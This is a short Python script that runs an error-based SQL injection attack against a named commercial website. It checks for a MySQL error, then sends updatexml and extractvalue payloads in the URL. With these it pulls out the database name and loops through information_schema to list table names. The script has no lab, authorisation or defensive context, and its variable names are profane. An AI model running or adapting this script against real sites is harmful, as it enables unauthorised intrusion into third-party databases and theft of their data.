import requests
import re
import time

fuckurl = 'http://www.zhuoce.com.cn/newMediaMarketing.php?cid=17&id=28'
url = 'http://www.zhuoce.com.cn/newMediaMarketing.php?cid=17&id=28%27'

headers={'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36'}

html = requests.get(url,headers=headers)
text = html.text
print(text)
if 'MySql Error' in text:
    # print('ok')
    fuck = fuckurl + '-@`%27`%20and%201=updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%20and%20id=@`%27`'
    # print(fuck)
    html2 = requests.get(fuck,headers=headers)
    for i in range(20,90):
        fucktables = fuckurl + '-@`%27`%20and%20extractvalue(0x0a,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20limit%20' + str(
            i) + ',1),0x7e))%20and%20id=@`%27`'

        print(fucktables)
        html3 = requests.get(fucktables,headers=headers)
        exe=html3.text
        # print(exe)
        time.sleep(5)
        txt1 = r'~(.*)~'
        texts = re.findall(txt1, exe)
        print("the web's tables is " + str(texts))
        time.sleep(10)

    txt = r'~(.*)~'
    texts = re.findall(txt, html2.text)
    print("the web's database is " + str(texts))

else:
    print('GG')
